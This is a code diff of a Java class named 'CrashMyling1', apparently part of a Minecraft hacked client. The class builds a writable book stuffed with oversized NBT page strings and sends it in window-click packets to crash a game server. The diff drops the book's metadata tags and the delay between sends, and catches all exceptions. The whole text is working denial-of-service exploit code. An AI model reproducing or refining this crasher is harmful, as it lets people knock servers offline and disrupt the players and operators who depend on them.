@@ -32,18 +32,14 @@ public class CrashMyling1 extends Crash {
                     NBTTagList list = new NBTTagList();
                     for (int i = 0; i < 5; i++)
                         list.appendTag(new NBTTagString("17283128931273891237198237128931298371829371982378213"));
-                    comp.setString("author", Minecraft.getMinecraft().getSession().getUsername());
-                    comp.setString("title", "Ayakashi");
-                    comp.setByte("resolved", (byte) 1);
                     comp.setTag("pages", list);
                     ItemStack stack = new ItemStack(Items.writable_book);
                     stack.setTagCompound(comp);
                     PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
                     buffer.writeItemStackToBuffer(stack);
                     Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, 0, 0, 1, stack, (short) 0));
-                    Thread.sleep(2000L);
                 }
-            } catch (InterruptedException ignored) {
+            } catch (Exception ignored) {
             }
         })).start();
         ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
